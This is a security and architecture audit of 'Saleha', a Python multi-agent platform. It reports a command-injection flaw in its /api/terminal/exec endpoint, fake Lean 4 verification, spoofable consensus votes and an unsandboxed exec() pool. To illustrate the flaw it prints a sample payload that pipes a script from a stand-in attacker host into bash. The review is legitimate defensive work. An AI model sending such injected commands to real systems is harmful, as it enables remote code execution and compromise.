# Saleha (saleha-0.1) — Architecture Assessment & Code Review

**Date:** 2026-09-03
**Scope:** Full repository audit (`C:\Users\alama\saleha-0.1`), focused on the Python core (`saleha/`, 476 files / ~53.5k LOC excluding tests) and the HTTP server (`saleha/server/web_server.py`, 2,460 lines). The TypeScript monorepo (`apps/`, `packages/`) and Rust crate (`rust/`) were surveyed structurally but not deep-reviewed line-by-line.
**Method:** Direct inspection of source files, greps for known risk patterns (`eval`/`exec`, `shell=True`, bare `except`, hardcoded secrets, pickle), and reading of the project's own docs (`README.md`, `ARCHITECTURE.md`) against the code that backs their claims.

---

## Summary

Saleha is an extremely ambitious solo/small-team project: a 53k-line Python "autonomous multi-agent" platform plus a TypeScript monorepo and Rust crate, documented as **34 "sovereign flagship intelligence modules"** including PBFT Byzantine consensus, Lean 4 formal verification, Pearl causal world models, and a 16-dimensional hyperbolic swarm topology. The engineering effort is real and the code generally runs (all found code parses and has matching unit tests). The core problem is not "the code is broken" — it's that **the documentation and module names promise formally verified, distributed, security-hardened infrastructure that the implementation does not deliver**, and that gap creates real risk anywhere a user or downstream agent trusts those claims. Alongside that, there's one exploitable command-injection bug, and a codebase organization pattern (one flat 205-file `core/` folder) that will make the project increasingly hard to maintain as it grows.

**Verdict: Needs Discussion / Request Changes.** Nothing here blocks casual local use, but the security finding should be fixed before this server is ever exposed beyond localhost, and the "formal verification" / "causal reasoning" claims should either be implemented for real or clearly relabeled as heuristics — as written they can mislead a user (or an autonomous agent consuming these reports) into trusting unverified code.

---

## Part 1 — Architecture Assessment

### Context

`ARCHITECTURE.md` and `README.md` describe Saleha as an enterprise-grade platform spanning a Next.js/Tauri/Prisma/tRPC TypeScript monorepo and a Python "autonomous core" with 34 intelligence modules (PBFT consensus, formal Lean 4 proofs, causal world models, quantum gate simulation, hyperbolic swarm routing, etc.). The actual runtime that ships is a single-process Python CLI/HTTP server (`saleha/`) plus a largely separate, much smaller TypeScript app tree. This assessment evaluates the architecture as built, not as marketed.

### Findings

**1. Flat "god folder" — `saleha/core/` (🔴 High)**
`saleha/core/` contains **205 Python files** (of 476 in the whole `saleha/` package) with no sub-packages: agent orchestration, HTTP helpers, security scanning, voice, browser automation, quantum simulation, and consensus protocols all sit side-by-side as top-level modules. There is no `core/agents/`, `core/security/`, `core/consensus/`, etc. This makes ownership, import graphs, and even simple "what does core actually do" questions hard to answer, and it will only get worse as more "modules" are added. Evidence of the fallout: 3 separate browser modules (`browser_agent.py`, `browser_runner.py`, `browser_tester.py`), 4 separate voice modules (`voice_assistant.py`, `voice_engine.py`, `voice_live.py`, `full_duplex_voice.py`), and 6 separate swarm/consensus modules (`p2p_swarm.py`, `saleha_swarm_topology.py`, `swarm_checkpoint_store.py`, `swarm_consensus.py`, `swarm_pipeline_engine.py`, `swarm_self_play_arena.py`, plus `sheaf_consensus.py` and `debate_consensus_orchestrator.py`) with no obvious single source of truth for "how does the swarm reach a decision."

**2. God files in the CLI and server layers (🟡 Medium)**
`saleha/cli/commands.py` is **6,470 lines** and `saleha/server/web_server.py` is **2,460 lines**, the latter mixing raw HTML/CSS/JS templates, HTTP routing, auth, and business logic (including a "Whale Radar" crypto-transfer monitor and a git-ops panel) in one file. Neither has an obvious seam for unit testing individual routes/commands in isolation from the giant dispatch function.

**3. Documentation describes infrastructure that isn't in the code path (🔴 High)**
`ARCHITECTURE.md`'s diagram and prose describe multi-tenant Prisma sharding, tRPC end-to-end type safety, 250 lock-free SPSC cache-aligned ring buffers doing 7.7M ops/sec, and a 16-D non-Euclidean Poincaré ball swarm router. What actually executes for `saleha <command>` is single-process Python with in-memory dataclasses. This isn't necessarily dishonest — it may describe an aspirational or partially-prototyped TS layer — but as written in the top-level architecture doc it's indistinguishable from a description of the shipped system, and a reader (human or another AI agent onboarding to this repo) has no way to tell which parts are real.

**4. Inconsistent facts between the two top-level docs (🟢 Low)**
`ARCHITECTURE.md` states "685 / 685 passing (100% Green)"; `README.md` states "783/783 Passed" and separately "783 passed, 4 skipped in 51.42s". These are two different numbers for the same claim, evidence the docs aren't regenerated alongside the code.

**5. No clear module boundary/dependency direction** — because everything lives in one `core` package, nothing stops circular imports between, e.g., a "security scanner" module and a "swarm" module. Worth an explicit import-graph check before this grows further (not verified in this pass, but the flat layout makes it likely).

### Trade-off Analysis

| Dimension | As documented | As built |
|---|---|---|
| Distribution / scale | Multi-tenant, sharded, cloud-syncing | Single local process |
| Consensus safety | Byzantine-fault-tolerant swarm | In-memory vote counter, no identity verification (see code review §1) |
| Verification | Formal Lean 4 / Mathlib proofs | Template string, doesn't inspect the target function (see code review §2) |
| Sandbox isolation | "Isolated Process/Container Sandbox", ASan memory safety | Raw Python `exec()` in-process for the "fast" path (see code review §4) |

### Consequences
- Easier: rapid addition of new "modules" without touching shared abstractions (which is presumably how it grew to 205 files).
- Harder: onboarding, code review, refactoring, and — most importantly — **trusting the platform's own self-reports** (formal-verify, consensus, causal-eval) when those reports don't reflect what actually happened.
- Needs revisiting soon: splitting `core/` into real sub-packages, and auditing every module whose name implies a guarantee (formal, consensus, sandbox, ASan) against what it actually does, then either implementing it or renaming/relabeling it as a heuristic/prototype.

### Recommendations (Action Items)
1. [ ] Reorganize `saleha/core/` into sub-packages by concern (`agents/`, `security/`, `swarm/`, `voice/`, `browser/`, `verification/`) — pure mechanical move, high value.
2. [ ] Add a "Reality Check" section to `ARCHITECTURE.md` distinguishing shipped vs. prototype vs. aspirational components, or split the TS-monorepo vision doc from the Python-core doc.
3. [ ] Regenerate the test-count badges from CI output rather than hand-editing two docs independently.
4. [ ] Before adding more "swarm"/"consensus"/"voice" files, consolidate the existing duplicates or document why each one exists.

---

## Part 2 — Code Review

### Summary
The Python core is readable, type-hinted, and each inspected module has a corresponding unit test that passes for what the module actually does. The problems found aren't sloppy code — they're modules whose behavior doesn't match their name/docstring/marketing claim, plus one real, exploitable injection bug in the HTTP server's terminal endpoint.

### Critical Issues

| # | File | Line | Issue | Severity |
|---|------|------|-------|----------|
| 1 | `saleha/server/web_server.py` | 2102–2126 | `/api/terminal/exec` "allowlists" commands by checking only the **first whitespace-split token** (`echo`, `python`, `git`, …), then runs the **entire raw string** via `subprocess.check_output(command, shell=True, ...)`. Because `shell=True` interprets the whole string, an attacker (anyone with the session's `X-Saleha-Token`) can send e.g. `git status; curl evil.example/x.sh | bash` — `git` passes the allowlist check, and the shell then executes the injected second command with full privileges of the server process. This is textbook command injection; the allowlist provides no real protection under `shell=True`. | 🔴 Critical |
| 2 | `saleha/core/formal_verifier.py` | 66–93 | `synthesize_proof_for_function()` **ignores its `code` argument entirely** and always emits the same hardcoded Lean 4 theorem (`a + b >= a`, proved via `Nat.le_add_right`), regardless of which function was passed in. It unconditionally sets `correctness_guarantee="Lean 4 / Mathlib Mathematical Correctness Proven"` and `is_valid_syntax=True` — no Lean toolchain is ever invoked to actually typecheck the proof. Any caller (CLI `saleha formal-verify`, or an autonomous agent gating a patch on this result) is told arbitrary code is "mathematically proven correct" when nothing was proven or even inspected. | 🔴 Critical (integrity of a safety gate) |

### Suggestions

| # | File | Line | Suggestion | Category |
|---|------|------|------------|----------|
| 1 | `saleha/core/swarm_consensus.py` | 79–91 | `cast_prepare_vote`/`cast_commit_vote` accept a free-text `voter_id` with no signature or identity check tied to the actual calling agent. A single caller can cast votes for all registered validator names itself and always reach the 2f+1 quorum, which defeats the stated purpose of Byzantine fault tolerance ("automatically rejects hallucinations and rogue agent suggestions"). If this gates real commits, add per-agent authentication (e.g., signed votes) before trusting `evaluate_consensus()`. | Correctness / Security |
| 2 | `saleha/core/causal_world_model.py` | 78–91 | `simulate_l2_intervention` / `evaluate_l3_counterfactual` return **hardcoded confidence values** (`0.92`, `0.88`) regardless of input — they aren't derived from the (also hand-authored, 6-variable) causal graph or any data. Either compute a real confidence (e.g., from edge-weight coverage) or stop reporting a numeric confidence, since a fixed number implies a calibration that doesn't exist. | Correctness |
| 3 | `saleha/core/prewarmed_sandbox_pool.py` | 36–53 | `PreWarmedWorker.execute_snippet` runs untrusted code via plain in-process `exec(code, glob, loc)` with the real `__builtins__` — no subprocess boundary, no resource/time limits beyond wall-clock timing, no restricted globals. This is fine for trusted local snippets but is not the "isolated sandbox" the docs describe elsewhere (`docker_sandbox.py` exists separately and appears to be the real isolation path) — worth renaming this module or gating its use so callers don't reach for the "fast" pool when isolation actually matters. | Security |
| 4 | `saleha/core/self_healer.py` | 119–126 | `run_command()` runs an arbitrary `command` string via `subprocess.run(..., shell=True)`. Lower risk than #1 since it's driven by internal test/build commands rather than a raw HTTP field, but confirm nothing upstream ever builds `command` from agent-generated or file-derived text before it reaches here. | Security |
| 5 | `saleha/server/web_server.py` | 82, 2437–2444 | The per-process auth token (`secrets.token_urlsafe(32)`) is injected into the served HTML and also `print()`-ed to stdout on startup. If server stdout is ever captured to a log file, CI output, or shared terminal recording, the token — and therefore full API access including the vulnerable terminal endpoint — leaks. Consider redacting from stdout by default and requiring an explicit flag to print it. | Security |
| 6 | `saleha/experimental/aionx/extensions_v10.py` | 81, 218, 232 | Three bare `except:` clauses silently swallow all exceptions (including `KeyboardInterrupt`/`SystemExit`) and substitute default values, which can mask real bugs during debugging. Narrow to `except Exception:` at minimum. | Maintainability |
| 7 | `saleha/cli/commands.py` | whole file | 6,470 lines in one file handling dozens of subcommands — consider splitting per command-group (e.g., one module per `saleha <verb>`) so individual commands can be tested and reviewed independently. | Maintainability |

### What Looks Good
- Every inspected module has real, non-trivial unit tests that exercise its actual (if sometimes simplistic) behavior — the test suite isn't padded with `assert True`.
- The one place that *does* need auth (the HTTP API) has it: all `/api/*` routes require a constant-time-compared bearer token (`secrets.compare_digest`), and the server binds to `127.0.0.1` by default.
- `security_scanner.py` and `safety_patterns.py` correctly flag `eval`/`exec`/`shell=True` as dangerous patterns in *other* people's code — the irony is that the same patterns appear unflagged in the platform's own server and sandbox code (see Critical #1 and Suggestion #3), which is a good "run the scanner on itself" exercise to add to CI.
- No hardcoded credentials, API keys, or `.env` secrets were found in the scanned tree.

### Verdict
**Request Changes.** Fix Critical #1 (command injection) before this server is ever bound to anything but localhost or handed a token to a less-trusted caller. Fix or clearly relabel Critical #2 (fake formal verification) since it's actively misleading about a safety guarantee. The rest are worth a follow-up pass but aren't blocking for local, single-user use.
